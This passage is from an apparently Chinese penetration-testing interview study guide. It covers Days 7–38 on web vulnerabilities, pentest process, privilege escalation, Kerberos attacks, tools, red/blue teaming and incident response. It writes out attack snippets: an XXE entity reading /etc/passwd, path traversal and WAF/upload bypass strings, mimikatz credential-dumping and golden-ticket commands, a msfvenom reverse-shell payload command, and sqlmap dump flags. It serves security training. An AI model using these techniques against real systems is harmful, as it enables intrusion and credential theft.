+- <strong>PHP</strong>：命令执行 <code>system() exec() shell_exec() passthru() popen()</code>、<code>\</code>反引号`<code>；代码执行</code>eval() assert() preg_replace(/e) create_function()<code>。
+- **Java**：</code>Runtime.exec()<code>、</code>ProcessBuilder<code>、</code>Groovy/SpEL/Ognl<code>表达式、</code>ScriptEngine<code>。
+- **防御**：禁用危险函数（</code>disable_functions<code>）；绝不拼接用户输入进命令/表达式；用白名单参数；白名单校验文件/命令；RASP 运行时防护。
+**解析**：</code>Runtime.exec()<code>不支持 shell 重定向/管道，需经</code>/bin/sh -c`。Java 表达式注入（SpEL/Ognl）常见于 Spring/Struts 历史洞。
+<strong>考察知识点</strong>：危险函数清单、命令注入与代码注入差异、disable_functions。</p>
+<h3 id="day-8">Day 8 ｜ 文件上传漏洞与绕过<a class="headerlink" href="#day-8" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：文件上传漏洞有哪些绕过方式？如何根本防御？
+<strong>答案</strong>：
+- <strong>绕过</strong>：前端 JS 校验（Burp 改包）；服务端后缀黑名单不全（<code>.php5 .phtml .pht</code>、<code>.asa .cer</code>、大小写、<code>.php.</code>、空格点、<code>::$DATA</code>、双后缀 <code>.php.jpg</code>）；Content-Type 伪造；<code>.htaccess</code>/<code>user.ini</code> 解析；00 截断（旧版）；二次渲染绕过（维持图片马结构）；竞争条件（先传后删）。
+- <strong>防护</strong>：<strong>白名单</strong>后缀（仅允许业务需要的类型）；重命名随机文件名（用户不可控扩展名）；存于非执行目录；限制 Content-Type 并二次渲染；单独域名/隔离存储（如 OSS）。
+<strong>解析</strong>：黑名单永远有遗漏，白名单 + 随机重命名 + 非执行存储位是黄金组合。<code>.htaccess</code> 写入需目录允许覆盖配置。
+<strong>考察知识点</strong>：黑白名单、解析漏洞、00 截断、二次渲染、随机命名。</p>
+<h3 id="day-9-web">Day 9 ｜ 常见 Web 容器解析漏洞<a class="headerlink" href="#day-9-web" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：IIS / Apache / Nginx 有哪些经典解析漏洞？
+<strong>答案</strong>：
+- <strong>IIS 6.0</strong>：<code>*.asp;*.jpg</code> 按 asp 解析；目录 <code>/*.asp/</code> 下文件当 asp。
+- <strong>Apache</strong>：多后缀从右往左认，遇不认识的后缀继续向左（<code>a.php.xxx</code> 若 <code>.xxx</code> 未知可能按 <code>.php</code> 解析）；<code>AddHandler</code> 配置 <code>*.php</code> 导致 <code>x.php.jpg</code> 解析。
+- <strong>Nginx</strong>：<code>xxx.jpg/1.php</code> 若 <code>cgi.fix_pathinfo=1</code> 且 PHP 配置不当会解析；空字节 <code>%00.php</code> 旧版；<code>x.jpg%00.php</code> 截断。
+<strong>解析</strong>：本质都是"解析器对路径/后缀的处理规则"与预期不符。修复靠升级版本与收紧配置（关闭 <code>cgi.fix_pathinfo</code>、正确设置 <code>security.limit_extensions</code>）。
+<strong>考察知识点</strong>：IIS/Apache/Nginx 解析差异、fix_pathinfo、后缀处理顺序。</p>
+<h3 id="day-10-xxe">Day 10 ｜ XXE 原理与防御<a class="headerlink" href="#day-10-xxe" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：什么是 XXE？如何产生与防御？
+<strong>答案</strong>：
+- <strong>原理</strong>：XML 解析器启用外部实体（DTD）时，攻击者构造 <code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code> 读取本地文件，或用 <code>http://</code> 造成 SSRF、拒绝服务（Billion Laughs 实体膨胀）。
+- <strong>防御</strong>：<strong>禁用外部实体</strong>（<code>libxml_disable_entity_loader(true)</code> / <code>XMLConstants.FEATURE_SECURE_PROCESSING</code> / 关闭 <code>DOCTYPE</code>）；使用 JSON 替代 XML；升级解析库。
+<strong>解析</strong>：XXE 常出现在支持 XML 的接口（SVG 上传、Office 文档、SOAP、SSO SAML）。本质是"解析器信任了外部实体声明"。
+<strong>考察知识点</strong>：外部实体、DTD、实体膨胀、禁用实体加载。</p>
+<h3 id="day-11-php-java">Day 11 ｜ 反序列化漏洞原理（PHP / Java）<a class="headerlink" href="#day-11-php-java" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：反序列化漏洞是什么？PHP 与 Java 有何不同？
+<strong>答案</strong>：
+- <strong>原理</strong>：把用户可控的序列化数据反序列化时，对象重建过程触发<strong>魔术方法/生命周期回调</strong>（PHP 的 <code>__destruct()</code> <code>__wakeup()</code>，Java 的 <code>readObject()</code>），若其中调用危险方法且参数可控即 RCE。
+- <strong>PHP</strong>：<code>unserialize($_GET['data'])</code>，依赖 POP 链（如 <code>__destruct → call → system</code>）。
+- <strong>Java</strong>：依赖存在 gadget 的库（CommonsCollections、CommonsBeanutils、FastJson、Jackson），构造利用链触发 <code>Runtime.exec</code>/<code>Method.invoke</code>。
+- <strong>防御</strong>：不反序列化不可信数据；使用白名单类名（<code>ObjectInputFilter</code>）；升级含已知 gadget 的库；签名校验数据完整性。
+<strong>解析</strong>：Java 反序列化不等于"任意反序列化就 RCE"，关键是有<strong>可利用的 gadget 链</strong>。Shiro（硬编码 key + CB 链）、FastJson（<code>@type</code> 自动类型）是经典入口。
+<strong>考察知识点</strong>：序列化/反序列化、魔术方法、POP/gadget 链、Shiro/FastJson。</p>
+<h3 id="day-12">Day 12 ｜ 逻辑漏洞：越权 / 支付 / 验证码 / 密码找回<a class="headerlink" href="#day-12" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：常见的业务逻辑漏洞有哪些？如何修复？
+<strong>答案</strong>：
+- <strong>越权</strong>：水平（改 <code>user_id</code> 看他人数据）、垂直（普通用户访问管理员接口）。修复：服务端<strong>严格校验当前用户对该资源的权限</strong>，不依赖前端隐藏。
+- <strong>支付/数量</strong>：修改金额、数量、为负、并发重复下单。修复：服务端重算价格、库存加锁、幂等校验。
+- <strong>验证码</strong>：前端校验、可重用、可爆破、不过期。修复：服务端校验、单次有效、限频、图形复杂度。
+- <strong>密码找回</strong>：改 <code>userid</code> 改他人邮箱、验证码回显、token 可预测。修复：绑定身份、token 随机且短时、校验一致性。
+<strong>解析</strong>：逻辑漏洞源于"只信前端/只信参数"。面试强调"所有权限与金额判断必须在服务端做，且基于当前会话身份"。
+<strong>考察知识点</strong>：水平/垂直越权、服务端鉴权、幂等、验证码安全。</p>
+<h3 id="day-13">Day 13 ｜ 未授权访问与任意文件读取/下载<a class="headerlink" href="#day-13" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：未授权访问和任意文件读取有哪些典型场景？
+<strong>答案</strong>：
+- <strong>未授权访问</strong>：Redis/MongoDB/Elasticsearch/Kibana/Solr 暴露在公网无认证；后台/API 仅靠 URL 隐藏；Actuator、Swagger 未鉴权泄露。
+- <strong>任意文件读取/下载</strong>：<code>download?file=../../etc/passwd</code>（路径遍历）；日志/模板读取；配合 <code>file://</code> 读源码、配钥。
+- <strong>修复</strong>：服务加认证与网络隔离；文件路径用 ID 映射（禁用户输入路径）；白名单目录；最小权限运行；关闭不必要的管理端。
+<strong>解析</strong>：路径遍历用 <code>../</code>、编码 <code>..%2f</code>、<code>....//</code> 绕过。未授权 Redis 常可直接写 webshell 或 SSH 公钥。
+<strong>考察知识点</strong>：路径遍历、目录穿越、服务未授权、ID 映射。</p>
+<h3 id="day-14-waf-bypass">Day 14 ｜ WAF bypass 思路<a class="headerlink" href="#day-14-waf-bypass" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：如何绕过 WAF 进行注入/上传/XSS？
+<strong>答案</strong>：
+- <strong>注入</strong>：混淆（注释 <code>/**/</code>、<code>/*!*/</code>、内联注释）、换行/编码（URL/Unicode/十六进制）、等价函数替换（<code>sleep</code>→<code>benchmark</code>、<code>substring</code>→<code>substr</code>）、分块传输（Chunked）、HTTP 参数污染（HPPT）、双写 <code>ununionion</code>、畸形包。
+- <strong>上传</strong>：见 Day 8 后缀/Content-Type/解析绕过。
+- <strong>XSS</strong>：标签/事件拼接（<code>&lt;img src=x onerror=&gt;</code>）、编码绕过、大小写/换行、利用 SVG/MathML。
+- <strong>根本</strong>：WAF 是边界，真正安全靠代码层修复；bypass 仅用于测试与证明危害。
+<strong>解析</strong>：现代云 WAF 还有分块、TLS 分片、超大数据包等绕过。强调"绕过是为了验证防护有效性，不是教攻击"。
+<strong>考察知识点</strong>：SQL/XSS 混淆、分块传输、参数污染、防御为本。</p>
+<hr />
+<h1 id="_2">模块二　渗透测试流程与方法<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<h3 id="day-15-ptes">Day 15 ｜ 渗透测试标准流程（PTES）<a class="headerlink" href="#day-15-ptes" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：一次完整的渗透测试流程是什么？
+<strong>答案</strong>：
+1. <strong>前期交互</strong>：明确目标、范围、授权边界、时间与方式（黑/白/灰盒）、交付物。
+2. <strong>情报收集（信息收集）</strong>：被动+主动，域名/IP/资产/端口/服务/指纹/人员。
+3. <strong>威胁建模</strong>：确定攻击面与优先级。
+4. <strong>漏洞分析</strong>：扫描+手工验证。
+5. <strong>漏洞利用</strong>：getshell、提权、内网横向。
+6. <strong>后渗透</strong>：权限维持、内网拓展、敏感数据。
+7. <strong>报告</strong>：漏洞清单、复现、危害、修复建议。
+8. <strong>复测</strong>：验证修复有效性。
+<strong>解析</strong>：PTES 是业界通用框架。强调"授权先行"——无书面授权的测试违法。护网/众测都需范围确认。
+<strong>考察知识点</strong>：PTES 阶段、授权、情报收集、后渗透、报告。</p>
+<h3 id="day-16">Day 16 ｜ 信息收集都收集什么<a class="headerlink" href="#day-16" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：渗透测试的信息收集阶段要收集哪些内容？
+<strong>答案</strong>：
+- <strong>资产</strong>：域名、子域、C 段、旁站、IP、CDN 前后的真实 IP、ASN。
+- <strong>服务</strong>：开放端口、服务/版本、Web 指纹（CMS、中间件、框架）、WAF 类型。
+- <strong>人员</strong>：whois、备案、邮箱、GitHub 泄露、社工库关联。
+- <strong>技术</strong>：目录/敏感文件（备份、.git、phpinfo）、JS 接口、API、配置泄露。
+- <strong>工具</strong>：OneForAll、subfinder、masscan、nmap、fofa/quake/hunter 等引擎。
+<strong>解析</strong>：信息收集决定攻击面宽度。旁站/C 段、真实 IP（绕 CDN）、GitHub 源码泄露常是突破口。
+<strong>考察知识点</strong>：资产测绘、真实 IP、指纹识别、OSINT。</p>
+<h3 id="day-17">Day 17 ｜ 黑盒 / 白盒 / 灰盒区别<a class="headerlink" href="#day-17" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：黑盒、白盒、灰盒测试的区别？
+<strong>答案</strong>：
+- <strong>黑盒</strong>：无内部信息，仅从外部模拟攻击者（最接近真实入侵）。
+- <strong>白盒</strong>：提供源码/架构/账号，做代码审计与配置审查（覆盖深）。
+- <strong>灰盒</strong>：部分信息（如普通账号），兼顾效率与真实度。
+<strong>解析</strong>：渗透测试实习常从黑盒起步，进阶需白盒代码审计能力。面试会问"你更擅长哪种"——如实说并说明学习路径。
+<strong>考察知识点</strong>：测试模型、代码审计、真实性 vs 覆盖度。</p>
+<h3 id="day-18-webshell">Day 18 ｜ 拿到 webshell 后的思路<a class="headerlink" href="#day-18-webshell" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：拿到一个 webshell 后，下一步怎么扩大战果？
+<strong>答案</strong>：
+1. <strong>判环境</strong>：系统（Linux/Win）、权限（whoami）、网络位置（是否内网）。
+2. <strong>提权</strong>：内核/服务/配置不当（见模块三）。
+3. <strong>信息搜集</strong>：配置文件（数据库/云 AK）、内网段、域信息。
+4. <strong>内网横向</strong>：端口扫描、口令复用、PTH、搭建代理（reGeorg/frp）。
+5. <strong>权限维持</strong>：计划任务、启停项、后门账号、webshell 变形。
+6. <strong>清理</strong>：清日志、测试数据，输出报告。
+<strong>解析</strong>：低权限 shell 价值有限，提权与内网才是关键。所有动作须在授权范围并记录，便于出报告与复测。
+<strong>考察知识点</strong>：后渗透、提权、内网横向、权限维持。</p>
+<h3 id="day-19-webshell">Day 19 ｜ 获取 webshell 的多种途径<a class="headerlink" href="#day-19-webshell" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：拿到一个网站 webshell 有哪些常见途径？
+<strong>答案</strong>：
+- 文件上传（解析/绕过，见 Day 8/9）；
+- 后台模板/配置文件编辑写入；
+- SQL 注入写文件（Day 2）；
+- 命令执行/代码执行点；
+- 反序列化/表达式注入（Day 11）；
+- 已知 CMS/中间件 RCE（Struts2、Log4j、Weblogic）；
+- 第三方组件/插件漏洞。
+<strong>解析</strong>：面试常问"优选哪种"——优先找<strong>最稳定、最难被发现</strong>的（如后台模板/配置写入），避免频繁上传大马触发告警。
+<strong>考察知识点</strong>：getshell 面、稳定性与隐蔽性权衡。</p>
+<h3 id="day-20">Day 20 ｜ 授权边界与合规<a class="headerlink" href="#day-20" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：渗透测试的合法边界是什么？
+<strong>答案</strong>：
+- 必须有<strong>书面授权</strong>（授权书/合同），明确目标、IP、时间、方式、禁止行为（如破坏、拖库、影响业务）。
+- 遵守《网络安全法》《数据安全法》《刑法》285/286 条；未经授权扫描/测试可能违法。
+- 护网/众测在指定范围与时段内进行；发现高危（如可 RCE、可拖库）及时上报，不扩大危害。
+<strong>解析</strong>：这是安全从业底线。面试必问"你做过未授权测试吗"——必须答"只在授权范围内"。CISP-PTE 也强调合规。
+<strong>考察知识点</strong>：授权测试、网络安全法、护网合规、红队纪律。</p>
+<hr />
+<h1 id="_3">模块三　权限提升与内网渗透<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<h3 id="day-21-windows">Day 21 ｜ Windows 常见提权方法<a class="headerlink" href="#day-21-windows" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：Windows 下常见的提权方式有哪些？
+<strong>答案</strong>：
+- <strong>系统漏洞</strong>：内核提权（如 MS16-032、CVE 提权），用 <code>systeminfo</code> 对照补丁。
+- <strong>服务/计划任务</strong>：服务路径可写（烂土豆系列 RottenPotato→JuicyPotato）、计划任务以 SYSTEM 运行且脚本可写。
+- <strong>错误权限配置</strong>：可写目录、AlwaysInstallElevated（msi 提权）、未引号服务路径。
+- <strong>令牌窃取</strong>：<code>Incognito</code>/<code>Potato</code> 系列盗用令牌。
+- <strong>工具</strong>：WinPEAS、PowerUp、Sherlock、MSF <code>local_exploit_suggester</code>。
+<strong>解析</strong>：先 <code>whoami /priv</code> 看是否有 <code>SeImpersonatePrivilege</code>（土豆类提权前提）。优先用 PEAS 类脚本全盘检查"错误配置"比盲打/exp 更稳。
+<strong>考察知识点</strong>：内核提权、令牌 impersonate、错误配置、WinPEAS。</p>
+<h3 id="day-22-linux">Day 22 ｜ Linux 常见提权方法<a class="headerlink" href="#day-22-linux" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：Linux 下常见的提权方式有哪些？
+<strong>答案</strong>：
+- <strong>内核漏洞</strong>：脏牛（CVE-2016-5195）、脏管道（CVE-2022-0847）等，比对内核版本。
+- <strong>SUID 滥用</strong>：<code>find / -perm -u=s</code> 找异常 SUID（如 <code>find</code>、<code>vim</code>、<code>nmap</code> 交互模式）。
+- <strong>sudo 配置不当</strong>：<code>sudo -l</code> 看可无密码执行的命令（如 <code>sudo vim</code>→<code>:!sh</code>）。
+- <strong>计划任务/可写脚本</strong>：cron 以 root 执行且文件可写。
+- <strong>环境变量劫持</strong>：<code>PATH</code> 劫持、sudo 的 <code>env_keep</code>。
+- <strong>工具</strong>：LinPEAS、linprivchecker、GTFOBins。
+<strong>解析</strong>：<code>sudo -l</code> 与 SUID 是最常见的"低垂果实"。GTFOBins 是查单条命令提权的权威库。
+<strong>考察知识点</strong>：SUID、sudo 滥用、cron、GTFOBins、LinPEAS。</p>
+<h3 id="day-23">Day 23 ｜ 内网渗透思路<a class="headerlink" href="#day-23" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：拿到边界机后，内网渗透的一般思路？
+<strong>答案</strong>：
+1. 本机信息：网卡、路由、域、登录会话、本地哈希（<code>mimikatz</code>/<code>sekurlsa</code>）。
+2. 内网存活与拓扑：扫描网段（arp/nbtscan/icmp）、端口服务。
+3. 横向移动：IPC$/WMI/psexec、SMB/WinRM、口令复用/爆破、PTH。
+4. 域渗透：定位域控、Kerberos 攻击（见 D24–D26）。
+5. 权限维持与凭据窃取：黄金票据、组策略、DCSync。
+6. 目标达成（域控/核心数据）后出报告。
+<strong>解析</strong>：内网核心是"凭据复用 + 信任关系利用"。先找域成员/域控，再围绕 Kerberos 做文章。
+<strong>考察知识点</strong>：内网拓扑、横向移动、凭据复用、域控定位。</p>
+<h3 id="day-24-kerberos">Day 24 ｜ 域渗透：Kerberos 认证过程<a class="headerlink" href="#day-24-kerberos" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：简述域环境中 Kerberos 认证流程。
+<strong>答案</strong>：
+- <strong>AS-REQ/AS-REP</strong>：客户向 AS 请求 TGT，AS 用 krbtgt 密钥加密返回 TGT（含会话密钥）。
+- <strong>TGS-REQ/TGS-REP</strong>：客户用 TGT 向 TGS 请求某服务票据（ST），TGS 用服务账号密钥加密 ST。
+- <strong>AP-REQ/AP-REP</strong>：客户携 ST 访问服务，服务用自身密钥解密校验。
+<strong>解析</strong>：理解三步走是关键。黄金票据伪造 TGT（需 krbtgt 哈希），白银票据伪造 ST（需服务账号哈希），分别对应不同环节。
+<strong>考察知识点</strong>：AS/TGS、TGT/ST、krbtgt、票据流转。</p>
+<h3 id="day-25">Day 25 ｜ 黄金票据 / 白银票据<a class="headerlink" href="#day-25" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：黄金票据和白银票据分别伪造什么？条件与区别？
+<strong>答案</strong>：
+- <strong>黄金票据（Golden Ticket）</strong>：伪造 <strong>TGT</strong>，需 <code>krbtgt</code> 账号的 NTLM 哈希 + 域名/SID/管理员名。效果：任意服务任意权限、长期有效、无需与 DC 通信。
+- <strong>白银票据（Silver Ticket）</strong>：伪造 <strong>ST</strong>，需目标<strong>服务账号</strong>哈希（如机器账号/SQL）。效果：仅对该服务有效、不留域控日志，但需知道服务名。
+<strong>解析</strong>：黄金票据权限更大、隐蔽性更强（不接触 DC），白银票据日志更少但范围小。两者都依赖"哈希泄露"，防护在凭据保护与 DC 加固。
+<strong>考察知识点</strong>：TGT vs ST 伪造、krbtgt、日志差异、凭据保护。</p>
+<h3 id="day-26-pth-pttmimikatz">Day 26 ｜ PTH / PTT、mimikatz<a class="headerlink" href="#day-26-pth-pttmimikatz" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：什么是 PTH、PTT？mimikatz 的作用？
+<strong>答案</strong>：
+- <strong>PTH（Pass The Hash）</strong>：直接用 NTLM 哈希认证，无需明文口令（如 <code>sekurlsa::pth</code>）。
+- <strong>PTT（Pass The Ticket）</strong>：传递票据（如注入黄金/白银票据、kirbi）。
+- <strong>mimikatz</strong>：提取明文/哈希（<code>sekurlsa::logonpasswords</code>）、票据（<code>sekurlsa::tickets</code>）、DCSync（<code>lsadump::dcsync</code>）、生成黄金票据（<code>kerberos::golden</code>）。
+<strong>解析</strong>：PTH 在 NTLM 环境有效；PTT 绕过 NTLM 限制。mimikatz 是域渗透标配工具，蓝队需在日志/EDR 层面检测其典型行为（如 lsass 读取）。
+<strong>考察知识点</strong>：哈希传递、票据传递、lsass、DCSync。</p>
+<h3 id="day-27">Day 27 ｜ 内网穿透<a class="headerlink" href="#day-27" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：什么是内网穿透？常见工具与场景？
+<strong>答案</strong>：
+- <strong>目的</strong>：把内网/靶机端口映射到公网或可访问点，便于用本机工具（MSF、C2）控制。
+- <strong>工具/方式</strong>：frp、ngrok、reGeorg（HTTP 隧道）、EarthWorm（ew）、SSH 反向隧道、CS 的 listener/beacon。
+- <strong>场景</strong>：目标只出网、无公网 IP；通过 webshell 建隧；护网中 C2 隐蔽通道。
+<strong>解析</strong>：穿透要解决"目标不暴露公网"的问题。reGeorg 走 HTTP 最不易被拦；frp 需一台公网跳板。注意流量加密与画像规避。
+<strong>考察知识点</strong>：frp/reGeorg、反向隧道、C2、流量隐蔽。</p>
+<hr />
+<h1 id="_4">模块四　安全工具<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<h3 id="day-28-burp-suite">Day 28 ｜ Burp Suite 核心功能<a class="headerlink" href="#day-28-burp-suite" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：Burp Suite 主要有哪几块功能？实战怎么用？
+<strong>答案</strong>：
+- <strong>Proxy</strong>：拦截/改包（重发、绕过前端校验）。
+- <strong>Repeater</strong>：手动重放、调 payload。
+- <strong>Intruder</strong>：爆破/模糊测试（Sniper/Cluster bomb 等攻击类型）。
+- <strong>Decoder/Comparer</strong>：编解码、差异比对。
+- <strong>Scanner（Pro）/Extensions</strong>：主动扫描、插件（如 SQLiPy、Authz、HaE）。
+<strong>解析</strong>：Proxy+Repeater+Intruder 是日常三件套；Authz 做越权测试、HaE 做被动信息收集。配合浏览器代理与证书安装。
+<strong>考察知识点</strong>：Proxy/Repeater/Intruder、攻击类型、插件生态。</p>
+<h3 id="day-29-sqlmap">Day 29 ｜ sqlmap 对注入点注入<a class="headerlink" href="#day-29-sqlmap" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：用 sqlmap 怎么对一个注入点注入？常用参数？
+<strong>答案</strong>：
+- 基本：<code>sqlmap -u "url?p=1" --batch</code>
+- 指定注入点/技术：<code>--data</code> POST、<code>-p id</code> 指定参数、<code>--technique=BEUST</code>（B布尔/E报错/U联合/S堆叠/T时间）。
+- 拖库：<code>--dbs / --tables / --dump</code>、<code>--current-db</code>、<code>--os-shell</code>（写 shell 需文件权限）。
+- 进阶：<code>--tamper=xxx</code>（绕过 WAF）、<code>--level=5 --risk=3</code>、<code>--threads</code>。
+<strong>解析</strong>：先用 <code>--batch</code> 自动确认；有 WAF 加 <code>--tamper</code>（如 <code>space2comment</code>、<code>charencode</code>）。<code>--os-shell</code> 依赖 Day 2 的文件写条件。
+<strong>考察知识点</strong>：sqlmap 参数、technique、tamper、os-shell。</p>
+<h3 id="day-30-nmap">Day 30 ｜ nmap 常用用法<a class="headerlink" href="#day-30-nmap" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：nmap 常用的扫描命令与脚本？
+<strong>答案</strong>：
+- 端口：<code>nmap -p- -sT</code> 全端口 TCP；<code>-sS</code> SYN 半开（需权限）；<code>-sU</code> UDP。
+- 服务/系统：<code>nmap -sV -O</code>；<code>-Pn</code> 跳过存活探测（禁 ping 环境）。
+- 脚本：<code>nmap --script=default/vuln/smb-*</code>；<code>-A</code> 综合。
+- 输出：<code>-oN/-oX</code> 保存。
+<strong>解析</strong>：<code>-sS</code> 快但需原始套接字权限（Windows 上常退回 <code>-sT</code>）；内网用 <code>-Pn</code> 避免被防火墙丢 icmp 漏主机。<code>vuln</code> 脚本可初筛已知漏洞。
+<strong>考察知识点</strong>：SYN 扫描、服务识别、NSE 脚本、-Pn。</p>
+<h3 id="day-31-metasploit-msf">Day 31 ｜ Metasploit (MSF) 使用<a class="headerlink" href="#day-31-metasploit-msf" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：Metasploit 的基本使用流程？
+<strong>答案</strong>：
+- <code>msfconsole</code> 进入；<code>search</code> 找模块；<code>use</code> 加载 exploit/auxiliary；<code>set RHOSTS/LPORT/PAYLOAD</code>；<code>exploit</code>/<code>run</code>。
+- 后渗透：<code>post/</code> 模块、<code>sessions</code> 管理、<code>migrate</code> 进程迁移、<code>getsystem</code> 提权、<code>hashdump</code>、<code>run persistence</code> 维持。
+- 生成 payload：<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o x.exe</code>。
+<strong>解析</strong>：MSF 是后渗透中枢，配合数据库（<code>db_nmap</code>）管理多目标。Meterpreter 强在内存执行与丰富后渗透命令。
+<strong>考察知识点</strong>：模块体系、payload、meterpreter、后渗透命令。</p>
+<h3 id="day-32">Day 32 ｜ 冰蝎 / 蚁剑 / 菜刀区别与流量特征<a class="headerlink" href="#day-32" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：菜刀、蚁剑、冰蝎有什么异同？流量特征？
+<strong>答案</strong>：
+- <strong>菜刀（Cknife）</strong>：老牌，明文/简单加密通信，特征明显易被检测。
+- <strong>蚁剑（AntSword）</strong>：开源、多平台、插件化，默认流量仍有特征。
+- <strong>冰蝎（Behinder）</strong>：<strong>流量加密</strong>（AES，密钥协商），无明显明文特征，较难检测；需服务端特定 eval 解析。
+- <strong>防守侧</strong>：WAF/IDS 靠正则与行为识别；冰蝎靠解密与异常长连接/非常规 UA 检测；建议用哥斯拉等更新马并自定义流量。
+<strong>解析</strong>：免杀与流量加密是红队重点，也是蓝队检测难点。面试常从"防守如何发现"反向考察。
+<strong>考察知识点</strong>：三款马差异、加密流量、检测思路、哥斯拉。</p>
+<hr />
+<h1 id="_5">模块五　护网·红蓝对抗·应急响应<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h1>
+<h3 id="day-33">Day 33 ｜ 护网行动与红蓝队职责<a class="headerlink" href="#day-33" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：什么是护网行动？红队、蓝队分别做什么？
+<strong>答案</strong>：
+- <strong>护网</strong>：国家/行业组织的网络安全实战攻防演练，红队攻击、蓝队防守，检验防护与应急能力。
+- <strong>红队</strong>：模拟真实攻击方，信息收集→外网突破→钓鱼/边界突破→内网横向→拿分（靶标系统）。强调隐蔽与合规。
+- <strong>蓝队</strong>：监测（流量/日志/终端）、研判告警、处置（封 IP/隔离主机）、溯源反制、编写报告。
+<strong>解析</strong>：护网是"以攻促防"。红队得分靠拿下指定靶标（如域控/业务系统），蓝队靠早发现、快处置、成功溯源反制。
+<strong>考察知识点</strong>：护网机制、红蓝分工、靶标、攻防对抗。</p>
+<h3 id="day-34">Day 34 ｜ 红队攻击思路<a class="headerlink" href="#day-34" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：红队一般怎么打？
+<strong>答案</strong>：
+1. 外网资产测绘（fofa/quake + 自研），找暴露面与 0day/NDay。
+2. Web 突破：注入/上传/反序列化/RCE 拿边界 webshell。
+3. 钓鱼：伪装邮件/客服，诱导运行木马（C2 上线）。
+4. 边界到内网：提权、内网横向、域渗透拿域控/靶标。
+5. 隐蔽：流量加密、免杀、清除痕迹、躲避蜜罐/蜜饵。
+<strong>解析</strong>：红队不只技术，还重社工与供应链。近年强调"不触碰非靶标、不扩大影响"，纪律第一。
+<strong>考察知识点</strong>：外网突破、钓鱼、横向、隐蔽、合规纪律。</p>
+<h3 id="day-35">Day 35 ｜ 蓝队监测防守思路<a class="headerlink" href="#day-35" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：蓝队如何监测与防守？
+<strong>答案</strong>：
+- <strong>监测</strong>：全流量探针、IDS/IPS、EDR、日志集中（SIEM）、威胁情报比对。
+- <strong>研判</strong>：区分误报与真实攻击（看 payload、源 IP、行为链）。
+- <strong>处置</strong>：封禁 IP、隔离主机、断网、改密、关端口、WAF 加规则。
+- <strong>反制</strong>：溯源攻击链、蜜罐诱捕、反制钓鱼样本回连。
+<strong>解析</strong>：蓝队靠"看见"能力（全流量+终端）。重点是从海量告警中快速定位高危真实事件并形成处置闭环。
+<strong>考察知识点</strong>：SIEM、EDR、流量分析、处置闭环、溯源。</p>
+<h3 id="day-36">Day 36 ｜ 应急响应流程（入侵排查）<a class="headerlink" href="#day-36" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：发生入侵/勒索时，应急响应流程是什么？
+<strong>答案</strong>：
+1. <strong>隔离</strong>：断网/封端口，防止扩散（保留现场）。
+2. <strong>研判</strong>：确认事件类型（webshell/勒索/挖矿/反弹 shell）、时间线。
+3. <strong>排查</strong>：进程（<code>ps</code>/<code>tasklist</code>）、网络连接（<code>netstat</code>）、启动项、计划任务、账号、近期文件、日志（web/安全/系统）。
+4. <strong>清除</strong>：删马、杀进程、修漏洞、改密、补丁。
+5. <strong>恢复</strong>：从干净备份恢复，业务验证。
+6. <strong>复盘</strong>：根因、加固、报告与改进。
+<strong>解析</strong>：原则是"先隔离后取证"，避免破坏证据。勒索优先断网+停共享，切忌盲目重启（可能触发锁盘）。
+<strong>考察知识点</strong>：应急响应 PDCERF、隔离取证、排查项、根因。</p>
+<h3 id="day-37-webshell">Day 37 ｜ webshell 查杀 / 内存马检测<a class="headerlink" href="#day-37-webshell" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：如何查杀 webshell 与内存马？
+<strong>答案</strong>：
+- <strong>webshell</strong>：文件特征（关键词 <code>eval</code>/<code>assert</code>/<code>base64_decode</code>、一句话）、MD5 比对、河马/ D 盾等查杀器、对比基线。
+- <strong>内存马</strong>：Java 中 Filter/Servlet/Listener 型无文件马，靠 arthas 看加载类、检查中间件上下文、dump 内存分析；重启可清除但需根除入口。
+<strong>解析</strong>：内存马无落地文件，传统文件查杀失效，需结合进程/类加载分析。防守要定位"为什么能注入"（反序列化/表达式注入入口）并修复。
+<strong>考察知识点</strong>：文件马 vs 内存马、arthas、无文件攻击、查杀器。</p>
+<h3 id="day-38">Day 38 ｜ 溯源反制思路<a class="headerlink" href="#day-38" title="Permanent link">&para;</a></h3>
